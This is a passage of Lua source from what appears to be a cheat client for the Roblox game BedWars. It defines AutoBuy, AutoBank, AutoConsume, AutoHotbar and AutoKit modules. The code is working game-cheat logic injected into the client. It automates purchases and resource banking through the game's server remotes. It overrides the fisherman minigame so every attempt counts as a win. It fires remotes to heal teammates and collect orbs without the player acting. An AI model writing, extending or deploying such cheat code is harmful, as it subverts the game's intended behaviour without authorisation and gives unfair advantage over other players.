		}):andThen(function(p11)
			if p11 then
				bedwars.SoundManager:playSound(bedwars.SoundList.BEDWARS_PURCHASE_ITEM)
				bedwars.ClientStoreHandler:dispatch({
					type = "BedwarsAddItemPurchased", 
					itemType = itemtab.itemType
				})
			end
			res = p11
		end)
		if waitdelay then 
			repeat task.wait() until res ~= nil
		end
	end

	local function buyUpgrade(upgradetype, inv, upgrades)
		if not AutoBuyUpgrades.Enabled then return end
		local teamupgrade = bedwars.Shop.getUpgrade(bedwars.Shop.TeamUpgrades, upgradetype)
		local teamtier = teamupgrade.tiers[upgrades[upgradetype] and upgrades[upgradetype] + 2 or 1]
		if teamtier then 
			local teamcurrency = getItem(teamtier.currency, inv.items)
			if teamcurrency and teamcurrency.amount >= teamtier.price then 
				bedwars.ClientHandler:Get("BedwarsPurchaseTeamUpgrade"):CallServerAsync({
					upgradeId = upgradetype, 
					tier = upgrades[upgradetype] and upgrades[upgradetype] + 1 or 0
				}):andThen(function(suc)
					if suc then
						bedwars.SoundManager:playSound(bedwars.SoundList.BEDWARS_PURCHASE_ITEM)
					end
				end)
			end
		end
	end

	local function getAxeNear(inv)
		for i5, v5 in pairs(inv or bedwarsStore.localInventory.inventory.items) do
			if v5.itemType:find("axe") and v5.itemType:find("pickaxe") == nil then
				return v5.itemType
			end
		end
		return nil
	end

	local function getPickaxeNear(inv)
		for i5, v5 in pairs(inv or bedwarsStore.localInventory.inventory.items) do
			if v5.itemType:find("pickaxe") then
				return v5.itemType
			end
		end
		return nil
	end

	local function getShopItem(itemType)
		if itemType == "axe" then 
			itemType = getAxeNear() or "wood_axe"
			itemType = axes[table.find(axes, itemType) + 1] or itemType
		end
		if itemType == "pickaxe" then 
			itemType = getPickaxeNear() or "wood_pickaxe"
			itemType = pickaxes[table.find(pickaxes, itemType) + 1] or itemType
		end
		for i,v in pairs(bedwars.ShopItems) do 
			if v.itemType == itemType then return v end
		end
		return nil
	end

	local buyfunctions = {
		Armor = function(inv, upgrades, shoptype) 
			if AutoBuyArmor.Enabled == false or shoptype ~= "item" then return end
			local currentarmor = (inv.armor[2] ~= "empty" and inv.armor[2].itemType:find("chestplate") ~= nil) and inv.armor[2] or nil
			local armorindex = (currentarmor and table.find(armors, currentarmor.itemType) or 0) + 1
			if armors[armorindex] == nil then return end
			local highestbuyable = nil
			for i = armorindex, #armors, 1 do 
				local shopitem = getShopItem(armors[i])
				if shopitem and (AutoBuyTierSkip.Enabled or i == armorindex) then 
					local currency = getItem(shopitem.currency, inv.items)
					if currency and currency.amount >= shopitem.price then 
						highestbuyable = shopitem
						bedwars.ClientStoreHandler:dispatch({
							type = "BedwarsAddItemPurchased", 
							itemType = shopitem.itemType
						})
					end
				end
			end
			if highestbuyable and (highestbuyable.ignoredByKit == nil or table.find(highestbuyable.ignoredByKit, bedwarsStore.equippedKit) == nil) then 
				buyItem(highestbuyable)
			end
		end,
		Sword = function(inv, upgrades, shoptype)
			if AutoBuySword.Enabled == false or shoptype ~= "item" then return end
			local currentsword = getItemNear("sword", inv.items)
			local swordindex = (currentsword and table.find(swords, currentsword.itemType) or 0) + 1
			if currentsword ~= nil and table.find(swords, currentsword.itemType) == nil then return end
			local highestbuyable = nil
			for i = swordindex, #swords, 1 do 
				local shopitem = getShopItem(swords[i])
				if shopitem then 
					local currency = getItem(shopitem.currency, inv.items)
					if currency and currency.amount >= shopitem.price and (shopitem.category ~= "Armory" or upgrades.armory) then 
						highestbuyable = shopitem
						bedwars.ClientStoreHandler:dispatch({
							type = "BedwarsAddItemPurchased", 
							itemType = shopitem.itemType
						})
					end
				end
			end
			if highestbuyable and (highestbuyable.ignoredByKit == nil or table.find(highestbuyable.ignoredByKit, bedwarsStore.equippedKit) == nil) then 
				buyItem(highestbuyable)
			end
		end,
		Protection = function(inv, upgrades)
			if not AutoBuyProt.Enabled then return end
			buyUpgrade("armor", inv, upgrades)
		end,
		Sharpness = function(inv, upgrades)
			if not AutoBuySharp.Enabled then return end
			buyUpgrade("damage", inv, upgrades)
		end,
		Generator = function(inv, upgrades)
			if not AutoBuyGen.Enabled then return end
			buyUpgrade("generator", inv, upgrades)
		end,
		Destruction = function(inv, upgrades)
			if not AutoBuyDestruction.Enabled then return end
			buyUpgrade("destruction", inv, upgrades)
		end,
		Diamond = function(inv, upgrades)
			if not AutoBuyDiamond.Enabled then return end
			buyUpgrade("diamond_generator", inv, upgrades)
		end,
		Alarm = function(inv, upgrades)
			if not AutoBuyAlarm.Enabled then return end
			buyUpgrade("alarm", inv, upgrades)
		end
	}

	AutoBuy = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoBuy", 
		Function = function(callback)
			if callback then 
				buyingthing = false 
				task.spawn(function()
					repeat
						task.wait()
						local found, npctype, enchant, newid = nearNPC(AutoBuyRange.Value)
						id = newid
						if found then
							local inv = bedwarsStore.localInventory.inventory
							local currentupgrades = bedwars.ClientStoreHandler:getState().Bedwars.teamUpgrades
							if bedwarsStore.equippedKit == "dasher" then 
								swords = {
									[1] = "wood_dao",
									[2] = "stone_dao",
									[3] = "iron_dao",
									[4] = "diamond_dao",
									[5] = "emerald_dao"
								}
							elseif bedwarsStore.equippedKit == "ice_queen" then 
								swords[5] = "ice_sword"
							elseif bedwarsStore.equippedKit == "ember" then 
								swords[5] = "infernal_saber"
							elseif bedwarsStore.equippedKit == "lumen" then 
								swords[5] = "light_sword"
							end
							if (AutoBuyGui.Enabled == false or (bedwars.AppController:isAppOpen("BedwarsItemShopApp") or bedwars.AppController:isAppOpen("BedwarsTeamUpgradeApp"))) and (not enchant) then
								for i,v in pairs(AutoBuyCustom.ObjectList) do 
									local autobuyitem = v:split("/")
									if #autobuyitem >= 3 and autobuyitem[4] ~= "true" then 
										local shopitem = getShopItem(autobuyitem[1])
										if shopitem then 
											local currency = getItem(shopitem.currency, inv.items)
											local actualitem = getItem(shopitem.itemType == "wool_white" and getWool() or shopitem.itemType, inv.items)
											if currency and currency.amount >= shopitem.price and (actualitem == nil or actualitem.amount < tonumber(autobuyitem[2])) then 
												buyItem(shopitem, tonumber(autobuyitem[2]) > 1)
											end
										end
									end
								end
								for i,v in pairs(buyfunctions) do v(inv, currentupgrades, npctype and "upgrade" or "item") end
								for i,v in pairs(AutoBuyCustom.ObjectList) do 
									local autobuyitem = v:split("/")
									if #autobuyitem >= 3 and autobuyitem[4] == "true" then 
										local shopitem = getShopItem(autobuyitem[1])
										if shopitem then 
											local currency = getItem(shopitem.currency, inv.items)
											local actualitem = getItem(shopitem.itemType == "wool_white" and getWool() or shopitem.itemType, inv.items)
											if currency and currency.amount >= shopitem.price and (actualitem == nil or actualitem.amount < tonumber(autobuyitem[2])) then 
												buyItem(shopitem, tonumber(autobuyitem[2]) > 1)
											end
										end
									end
								end
							end
						end
					until (not AutoBuy.Enabled)
				end)
			end
		end,
		HoverText = "Automatically Buys Swords, Armor, and Team Upgrades\nwhen you walk near the NPC"
	})
	AutoBuyRange = AutoBuy.CreateSlider({
		Name = "Range",
		Function = function() end,
		Min = 1,
		Max = 20,
		Default = 20
	})
	AutoBuyArmor = AutoBuy.CreateToggle({
		Name = "Buy Armor",
		Function = function() end, 
		Default = true
	})
	AutoBuySword = AutoBuy.CreateToggle({
		Name = "Buy Sword",
		Function = function() end, 
		Default = true
	})
	AutoBuyUpgrades = AutoBuy.CreateToggle({
		Name = "Buy Team Upgrades",
		Function = function(callback) 
			if AutoBuyUpgrades.Object then AutoBuyUpgrades.Object.ToggleArrow.Visible = callback end
			if AutoBuyGen.Object then AutoBuyGen.Object.Visible = callback end
			if AutoBuyProt.Object then AutoBuyProt.Object.Visible = callback end
			if AutoBuySharp.Object then AutoBuySharp.Object.Visible = callback end
			if AutoBuyDestruction.Object then AutoBuyDestruction.Object.Visible = callback end
			if AutoBuyDiamond.Object then AutoBuyDiamond.Object.Visible = callback end
			if AutoBuyAlarm.Object then AutoBuyAlarm.Object.Visible = callback end
		end, 
		Default = true
	})
	AutoBuyGen = AutoBuy.CreateToggle({
		Name = "Buy Team Generator",
		Function = function() end, 
	})
	AutoBuyProt = AutoBuy.CreateToggle({
		Name = "Buy Protection",
		Function = function() end, 
		Default = true
	})
	AutoBuySharp = AutoBuy.CreateToggle({
		Name = "Buy Sharpness",
		Function = function() end, 
		Default = true
	})
	AutoBuyDestruction = AutoBuy.CreateToggle({
		Name = "Buy Destruction",
		Function = function() end, 
	})
	AutoBuyDiamond = AutoBuy.CreateToggle({
		Name = "Buy Diamond Generator",
		Function = function() end, 
	})
	AutoBuyAlarm = AutoBuy.CreateToggle({
		Name = "Buy Alarm",
		Function = function() end, 
	})
	AutoBuyGui = AutoBuy.CreateToggle({
		Name = "Shop GUI Check",
		Function = function() end, 	
	})
	AutoBuyTierSkip = AutoBuy.CreateToggle({
		Name = "Tier Skip",
		Function = function() end, 
		Default = true
	})
	AutoBuyGen.Object.BackgroundTransparency = 0
	AutoBuyGen.Object.BorderSizePixel = 0
	AutoBuyGen.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuyGen.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuyProt.Object.BackgroundTransparency = 0
	AutoBuyProt.Object.BorderSizePixel = 0
	AutoBuyProt.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuyProt.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuySharp.Object.BackgroundTransparency = 0
	AutoBuySharp.Object.BorderSizePixel = 0
	AutoBuySharp.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuySharp.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuyDestruction.Object.BackgroundTransparency = 0
	AutoBuyDestruction.Object.BorderSizePixel = 0
	AutoBuyDestruction.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuyDestruction.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuyDiamond.Object.BackgroundTransparency = 0
	AutoBuyDiamond.Object.BorderSizePixel = 0
	AutoBuyDiamond.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuyDiamond.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuyAlarm.Object.BackgroundTransparency = 0
	AutoBuyAlarm.Object.BorderSizePixel = 0
	AutoBuyAlarm.Object.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	AutoBuyAlarm.Object.Visible = AutoBuyUpgrades.Enabled
	AutoBuyCustom = AutoBuy.CreateTextList({
		Name = "BuyList",
		TempText = "item/amount/priority/after",
		SortFunction = function(a, b)
			local amount1 = a:split("/")
			local amount2 = b:split("/")
			amount1 = #amount1 and tonumber(amount1[3]) or 1
			amount2 = #amount2 and tonumber(amount2[3]) or 1
			return amount1 < amount2
		end
	})
	AutoBuyCustom.Object.AddBoxBKG.AddBox.TextSize = 14

	local AutoBank = {Enabled = false}
	local AutoBankRange = {Value = 20}
	local AutoBankApple = {Enabled = false}
	local AutoBankBalloon = {Enabled = false}
	local AutoBankTransmitted, AutoBankTransmittedType = false, false
	local autobankoldapple
	local autobankoldballoon
	local autobankui

	local function refreshbank()
		if autobankui then
			local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
			for i,v in pairs(autobankui:GetChildren()) do 
				if echest:FindFirstChild(v.Name) then 
					v.Amount.Text = echest[v.Name]:GetAttribute("Amount")
				else
					v.Amount.Text = ""
				end
			end
		end
	end

	AutoBank = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoBank",
		Function = function(callback)
			if callback then
				autobankui = Instance.new("Frame")
				autobankui.Size = UDim2.new(0, 240, 0, 40)
				autobankui.AnchorPoint = Vector2.new(0.5, 0)
				autobankui.Position = UDim2.new(0.5, 0, 0, -240)
				autobankui.Visible = AutoBankUIToggle.Enabled
				task.spawn(function()
					repeat
						task.wait()
						if autobankui then 
							local hotbar = lplr.PlayerGui:FindFirstChild("hotbar")
							if hotbar then 
								local healthbar = hotbar["1"]:FindFirstChild("HotbarHealthbarContainer")
								if healthbar then 
									autobankui.Position = UDim2.new(0.5, 0, 0, healthbar.AbsolutePosition.Y - 50)
								end
							end
						else
							break
						end
					until (not AutoBank.Enabled)
				end)
				autobankui.BackgroundTransparency = 1
				autobankui.Parent = GuiLibrary.MainGui
				local emerald = Instance.new("ImageLabel")
				emerald.Image = bedwars.getIcon({itemType = "emerald"}, true)
				emerald.Size = UDim2.new(0, 40, 0, 40)
				emerald.Name = "emerald"
				emerald.Position = UDim2.new(0, 120, 0, 0)
				emerald.BackgroundTransparency = 1
				emerald.Parent = autobankui
				local emeraldtext = Instance.new("TextLabel")
				emeraldtext.TextSize = 20
				emeraldtext.BackgroundTransparency = 1
				emeraldtext.Size = UDim2.new(1, 0, 1, 0)
				emeraldtext.Font = Enum.Font.SourceSans
				emeraldtext.TextStrokeTransparency = 0.3
				emeraldtext.Name = "Amount"
				emeraldtext.Text = ""
				emeraldtext.TextColor3 = Color3.new(1, 1, 1)
				emeraldtext.Parent = emerald
				local diamond = emerald:Clone()
				diamond.Image = bedwars.getIcon({itemType = "diamond"}, true)
				diamond.Position = UDim2.new(0, 80, 0, 0)
				diamond.Name = "diamond"
				diamond.Parent = autobankui
				local gold = emerald:Clone()
				gold.Image = bedwars.getIcon({itemType = "gold"}, true)
				gold.Position = UDim2.new(0, 40, 0, 0)
				gold.Name = "gold"
				gold.Parent = autobankui
				local iron = emerald:Clone()
				iron.Image = bedwars.getIcon({itemType = "iron"}, true)
				iron.Position = UDim2.new(0, 0, 0, 0)
				iron.Name = "iron"
				iron.Parent = autobankui
				local apple = emerald:Clone()
				apple.Image = bedwars.getIcon({itemType = "apple"}, true)
				apple.Position = UDim2.new(0, 160, 0, 0)
				apple.Name = "apple"
				apple.Parent = autobankui
				local balloon = emerald:Clone()
				balloon.Image = bedwars.getIcon({itemType = "balloon"}, true)
				balloon.Position = UDim2.new(0, 200, 0, 0)
				balloon.Name = "balloon"
				balloon.Parent = autobankui
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				if entityLibrary.isAlive and echest then
					task.spawn(function()
						local chestitems = bedwarsStore.localInventory.inventory.items
						for i3,v3 in pairs(chestitems) do
							if (v3.itemType == "emerald" or v3.itemType == "iron" or v3.itemType == "diamond" or v3.itemType == "gold" or (v3.itemType == "apple" and AutoBankApple.Enabled) or (v3.itemType == "balloon" and AutoBankBalloon.Enabled)) then
								bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
								refreshbank()
							end
						end
					end)
				else
					task.spawn(function()
						refreshbank()
					end)
				end
				table.insert(AutoBank.Connections, replicatedStorageService.Inventories.DescendantAdded:Connect(function(p3)
					if p3.Parent.Name == lplr.Name then
						if echest == nil then 
							echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
						end	
						if not echest then return end
						if p3.Name == "apple" and AutoBankApple.Enabled then 
							if autobankapple then return end
						elseif p3.Name == "balloon" and AutoBankBalloon.Enabled then 
							if autobankballoon then vapeEvents.AutoBankBalloon:Fire() return end
						elseif (p3.Name == "emerald" or p3.Name == "iron" or p3.Name == "diamond" or p3.Name == "gold") then
							if not ((not AutoBankTransmitted) or (AutoBankTransmittedType and p3.Name ~= "diamond")) then return end
						else
							return
						end
						bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, p3)
						refreshbank()
					end
				end))
				task.spawn(function()
					repeat
						task.wait()
						local found, npctype = nearNPC(AutoBankRange.Value)
						if echest == nil then 
							echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
						end
						if autobankballoon then 
							local chestitems = echest and echest:GetChildren() or {}
							if #chestitems > 0 then
								for i3,v3 in pairs(chestitems) do
									if v3:IsA("Accessory") and v3.Name == "balloon" then
										if (not getItem("balloon")) then
											task.spawn(function()
												bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
												refreshbank()
											end)
										end
									end
								end
							end
						end
						if autobankballoon ~= autobankoldballoon and AutoBankBalloon.Enabled then 
							if entityLibrary.isAlive then
								if not autobankballoon then
									local chestitems = bedwarsStore.localInventory.inventory.items
									if #chestitems > 0 then
										for i3,v3 in pairs(chestitems) do
											if v3 and v3.itemType == "balloon" then
												task.spawn(function()
													bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
													refreshbank()
												end)
											end
										end
									end
								end
							end
							autobankoldballoon = autobankballoon
						end
						if autobankapple then 
							local chestitems = echest and echest:GetChildren() or {}
							if #chestitems > 0 then
								for i3,v3 in pairs(chestitems) do
									if v3:IsA("Accessory") and v3.Name == "apple" then
										if (not getItem("apple")) then
											task.spawn(function()
												bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
												refreshbank()
											end)
										end
									end
								end
							end
						end
						if (autobankapple ~= autobankoldapple) and AutoBankApple.Enabled then 
							if entityLibrary.isAlive then
								if not autobankapple then
									local chestitems = bedwarsStore.localInventory.inventory.items
									if #chestitems > 0 then
										for i3,v3 in pairs(chestitems) do
											if v3 and v3.itemType == "apple" then
												task.spawn(function()
													bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
													refreshbank()
												end)
											end
										end
									end
								end
							end
							autobankoldapple = autobankapple
						end
						if found ~= AutoBankTransmitted or npctype ~= AutoBankTransmittedType then
							AutoBankTransmitted, AutoBankTransmittedType = found, npctype
							if entityLibrary.isAlive then
								local chestitems = bedwarsStore.localInventory.inventory.items
								if #chestitems > 0 then
									for i3,v3 in pairs(chestitems) do
										if v3 and (v3.itemType == "emerald" or v3.itemType == "iron" or v3.itemType == "diamond" or v3.itemType == "gold") then
											if (not AutoBankTransmitted) or (AutoBankTransmittedType and v3.Name ~= "diamond") then 
												task.spawn(function()
													pcall(function()
														bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGiveItem"):CallServer(echest, v3.tool)
													end)
													refreshbank()
												end)
											end
										end
									end
								end
							end
						end
						if found then 
							local chestitems = echest and echest:GetChildren() or {}
							if #chestitems > 0 then
								for i3,v3 in pairs(chestitems) do
									if v3:IsA("Accessory") and ((npctype == false and (v3.Name == "emerald" or v3.Name == "iron" or v3.Name == "gold")) or v3.Name == "diamond") then
										task.spawn(function()
											pcall(function()
												bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
											end)
											refreshbank()
										end)
									end
								end
							end
						end
					until (not AutoBank.Enabled)
				end)
			else
				if autobankui then
					autobankui:Destroy()
					autobankui = nil
				end
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				local chestitems = echest and echest:GetChildren() or {}
				if #chestitems > 0 then
					for i3,v3 in pairs(chestitems) do
						if v3:IsA("Accessory") and (v3.Name == "emerald" or v3.Name == "iron" or v3.Name == "diamond" or v3.Name == "apple" or v3.Name == "balloon") then
							task.spawn(function()
								pcall(function()
									bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
								end)
								refreshbank()
							end)
						end
					end
				end
			end
		end
	})
	AutoBankUIToggle = AutoBank.CreateToggle({
		Name = "UI",
		Function = function(callback)
			if autobankui then autobankui.Visible = callback end
		end,
		Default = true
	})
	AutoBankApple = AutoBank.CreateToggle({
		Name = "Apple",
		Function = function(callback) 
			if not callback then 
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				local chestitems = echest and echest:GetChildren() or {}
				for i3,v3 in pairs(chestitems) do
					if v3:IsA("Accessory") and v3.Name == "apple" then
						task.spawn(function()
							bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
							refreshbank()
						end)
					end
				end
			end
		end,
		Default = true
	})
	AutoBankBalloon = AutoBank.CreateToggle({
		Name = "Balloon",
		Function = function(callback) 
			if not callback then 
				local echest = replicatedStorageService.Inventories:FindFirstChild(lplr.Name.."_personal")
				local chestitems = echest and echest:GetChildren() or {}
				for i3,v3 in pairs(chestitems) do
					if v3:IsA("Accessory") and v3.Name == "balloon" then
						task.spawn(function()
							bedwars.ClientHandler:GetNamespace("Inventory"):Get("ChestGetItem"):CallServer(echest, v3)
							refreshbank()
						end)
					end
				end
			end
		end,
		Default = true
	})
	AutoBankDeath = AutoBank.CreateToggle({
		Name = "Damage",
		Function = function() end,
		HoverText = "puts away resources when you take damage to prevent losing on death"
	})
	AutoBankStay = AutoBank.CreateToggle({
		Name = "Stay",
		Function = function() end,
		HoverText = "keeps resources until toggled off"
	})
	AutoBankRange = AutoBank.CreateSlider({
		Name = "Range",
		Function = function() end,
		Min = 1,
		Max = 20,
		Default = 20
	})
end)

runFunction(function()
	local AutoConsume = {Enabled = false}
	local AutoConsumeHealth = {Value = 100}
	local AutoConsumeSpeed = {Enabled = true}
	local AutoConsumeDelay = tick()

	local function AutoConsumeFunc()
		if entityLibrary.isAlive then
			local speedpotion = getItem("speed_potion")
			if lplr.Character:GetAttribute("Health") <= (lplr.Character:GetAttribute("MaxHealth") - (100 - AutoConsumeHealth.Value)) then
				autobankapple = true
				local item = getItem("apple")
				local pot = getItem("heal_splash_potion")
				if (item or pot) and AutoConsumeDelay <= tick() then
					if item then
						bedwars.ClientHandler:Get(bedwars.EatRemote):CallServerAsync({
							item = item.tool
						})
						AutoConsumeDelay = tick() + 0.6
					else
						local newray = workspace:Raycast((oldcloneroot or entityLibrary.character.HumanoidRootPart).Position, Vector3.new(0, -76, 0), bedwarsStore.blockRaycast)
						if newray ~= nil then
							bedwars.ClientHandler:Get(bedwars.ProjectileRemote):CallServerAsync(pot.tool, "heal_splash_potion", "heal_splash_potion", (oldcloneroot or entityLibrary.character.HumanoidRootPart).Position, (oldcloneroot or entityLibrary.character.HumanoidRootPart).Position, Vector3.new(0, -70, 0), game:GetService("HttpService"):GenerateGUID(), {drawDurationSeconds = 1})
						end
					end
				end
			else
				autobankapple = false
			end
			if speedpotion and (not lplr.Character:GetAttribute("StatusEffect_speed")) and AutoConsumeSpeed.Enabled then 
				bedwars.ClientHandler:Get(bedwars.EatRemote):CallServerAsync({
					item = speedpotion.tool
				})
			end
			if lplr.Character:GetAttribute("Shield_POTION") and ((not lplr.Character:GetAttribute("Shield_POTION")) or lplr.Character:GetAttribute("Shield_POTION") == 0) then
				local shield = getItem("big_shield") or getItem("mini_shield")
				if shield then
					bedwars.ClientHandler:Get(bedwars.EatRemote):CallServerAsync({
						item = shield.tool
					})
				end
			end
		end
	end

	AutoConsume = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoConsume",
		Function = function(callback)
			if callback then
				table.insert(AutoConsume.Connections, vapeEvents.InventoryAmountChanged.Event:Connect(AutoConsumeFunc))
				table.insert(AutoConsume.Connections, vapeEvents.AttributeChanged.Event:Connect(function(changed)
					if changed:find("Shield") or changed:find("Health") or changed:find("speed") then 
						AutoConsumeFunc()
					end
				end))
				AutoConsumeFunc()
			end
		end,
		HoverText = "Automatically heals for you when health or shield is under threshold."
	})
	AutoConsumeHealth = AutoConsume.CreateSlider({
		Name = "Health",
		Min = 1,
		Max = 99,
		Default = 70,
		Function = function() end
	})
	AutoConsumeSpeed = AutoConsume.CreateToggle({
		Name = "Speed Potions",
		Function = function() end,
		Default = true
	})
end)

runFunction(function()
	local AutoHotbarList = {Hotbars = {}, CurrentlySelected = 1}
	local AutoHotbarMode = {Value = "Toggle"}
	local AutoHotbarClear = {Enabled = false}
	local AutoHotbar = {Enabled = false}
	local AutoHotbarActive = false

	local function getCustomItem(v2)
		local realitem = v2.itemType
		if realitem == "swords" then
			local sword = getSword()
			realitem = sword and sword.itemType or "wood_sword"
		elseif realitem == "pickaxes" then
			local pickaxe = getPickaxe()
			realitem = pickaxe and pickaxe.itemType or "wood_pickaxe"
		elseif realitem == "axes" then
			local axe = getAxe()
			realitem = axe and axe.itemType or "wood_axe"
		elseif realitem == "bows" then
			local bow = getBow()
			realitem = bow and bow.itemType or "wood_bow"
		elseif realitem == "wool" then
			realitem = getWool() or "wool_white"
		end
		return realitem
	end
	
	local function findItemInTable(tab, item)
		for i, v in pairs(tab) do
			if v and v.itemType then
				if item.itemType == getCustomItem(v) then
					return i
				end
			end
		end
		return nil
	end

	local function findinhotbar(item)
		for i,v in pairs(bedwarsStore.localInventory.hotbar) do
			if v.item and v.item.itemType == item.itemType then
				return i, v.item
			end
		end
	end

	local function findininventory(item)
		for i,v in pairs(bedwarsStore.localInventory.inventory.items) do
			if v.itemType == item.itemType then
				return v
			end
		end
	end

	local function AutoHotbarSort()
		task.spawn(function()
			if AutoHotbarActive then return end
			AutoHotbarActive = true
			local items = (AutoHotbarList.Hotbars[AutoHotbarList.CurrentlySelected] and AutoHotbarList.Hotbars[AutoHotbarList.CurrentlySelected].Items or {})
			for i, v in pairs(bedwarsStore.localInventory.inventory.items) do 
				local customItem
				local hotbarslot = findItemInTable(items, v)
				if hotbarslot then
					local oldhotbaritem = bedwarsStore.localInventory.hotbar[tonumber(hotbarslot)]
					if oldhotbaritem.item and oldhotbaritem.item.itemType == v.itemType then continue end
					if oldhotbaritem.item then 
						bedwars.ClientStoreHandler:dispatch({
							type = "InventoryRemoveFromHotbar", 
							slot = tonumber(hotbarslot) - 1
						})
						vapeEvents.InventoryChanged.Event:Wait()
					end
					local newhotbaritemslot, newhotbaritem = findinhotbar(v)
					if newhotbaritemslot then
						bedwars.ClientStoreHandler:dispatch({
							type = "InventoryRemoveFromHotbar", 
							slot = newhotbaritemslot - 1
						})
						vapeEvents.InventoryChanged.Event:Wait()
					end
					if oldhotbaritem.item and newhotbaritemslot then 
						local nextitem1, nextitem1num = findininventory(oldhotbaritem.item)
						bedwars.ClientStoreHandler:dispatch({
							type = "InventoryAddToHotbar", 
							item = nextitem1, 
							slot = newhotbaritemslot - 1
						})
						vapeEvents.InventoryChanged.Event:Wait()
					end
					local nextitem2, nextitem2num = findininventory(v)
					bedwars.ClientStoreHandler:dispatch({
						type = "InventoryAddToHotbar", 
						item = nextitem2, 
						slot = tonumber(hotbarslot) - 1
					})
					vapeEvents.InventoryChanged.Event:Wait()
				else
					if AutoHotbarClear.Enabled then 
						local newhotbaritemslot, newhotbaritem = findinhotbar(v)
						if newhotbaritemslot then
							bedwars.ClientStoreHandler:dispatch({
								type = "InventoryRemoveFromHotbar", 
								slot = newhotbaritemslot - 1
							})
							vapeEvents.InventoryChanged.Event:Wait()
						end
					end
				end
			end
			AutoHotbarActive = false
		end)
	end

	AutoHotbar = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoHotbar",
		Function = function(callback) 
			if callback then
				AutoHotbarSort()
				if AutoHotbarMode.Value == "On Key" then
					if AutoHotbar.Enabled then 
						AutoHotbar.ToggleButton(false)
					end
				else
					table.insert(AutoHotbar.Connections, vapeEvents.InventoryAmountChanged.Event:Connect(function()
						if not AutoHotbar.Enabled then return end
						AutoHotbarSort()
					end))
				end
			end
		end,
		HoverText = "Automatically arranges hotbar to your liking."
	})
	AutoHotbarMode = AutoHotbar.CreateDropdown({
		Name = "Activation",
		List = {"On Key", "Toggle"},
		Function = function(val)
			if AutoHotbar.Enabled then
				AutoHotbar.ToggleButton(false)
				AutoHotbar.ToggleButton(false)
			end
		end
	})
	AutoHotbarList = CreateAutoHotbarGUI(AutoHotbar.Children, {
		Name = "lol"
	})
	AutoHotbarClear = AutoHotbar.CreateToggle({
		Name = "Clear Hotbar",
		Function = function() end
	})
end)

runFunction(function()
	local AutoKit = {Enabled = false}
	local AutoKitTrinity = {Value = "Void"}
	local oldfish
	local function GetTeammateThatNeedsMost()
		local plrs = GetAllNearestHumanoidToPosition(true, 30, 1000, true)
		local lowest, lowestplayer = 10000, nil
		for i,v in pairs(plrs) do
			if not v.Targetable then
				if v.Character:GetAttribute("Health") <= lowest and v.Character:GetAttribute("Health") < v.Character:GetAttribute("MaxHealth") then
					lowest = v.Character:GetAttribute("Health")
					lowestplayer = v
				end
			end
		end
		return lowestplayer
	end

	AutoKit = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
		Name = "AutoKit",
		Function = function(callback)
			if callback then
				oldfish = bedwars.FishermanTable.startMinigame
				bedwars.FishermanTable.startMinigame = function(Self, dropdata, func) func({win = true}) end
				task.spawn(function()
					repeat task.wait() until bedwarsStore.equippedKit ~= ""
					if AutoKit.Enabled then
						if bedwarsStore.equippedKit == "melody" then
							task.spawn(function()
								repeat
									task.wait(0.1)
									if getItem("guitar") then
										local plr = GetTeammateThatNeedsMost()
										if plr and healtick <= tick() then
											bedwars.ClientHandler:Get(bedwars.GuitarHealRemote):SendToServer({
												healTarget = plr.Character
											})
											healtick = tick() + 2
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "bigman" then
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = collectionService:GetTagged("treeOrb")
									for i,v in pairs(itemdrops) do
										if entityLibrary.isAlive and v:FindFirstChild("Spirit") and (entityLibrary.character.HumanoidRootPart.Position - v.Spirit.Position).magnitude <= 20 then
											if bedwars.ClientHandler:Get(bedwars.TreeRemote):CallServer({
												treeOrbSecret = v:GetAttribute("TreeOrbSecret")
											}) then
												v:Destroy()
												collectionService:RemoveTag(v, "treeOrb")
											end
										end
									end
								until (not AutoKit.Enabled)
							end)
						elseif bedwarsStore.equippedKit == "metal_detector" then
							task.spawn(function()
								repeat
									task.wait()
									local itemdrops = collectionService:GetTagged("hidden-metal")
									for i,v in pairs(itemdrops) do
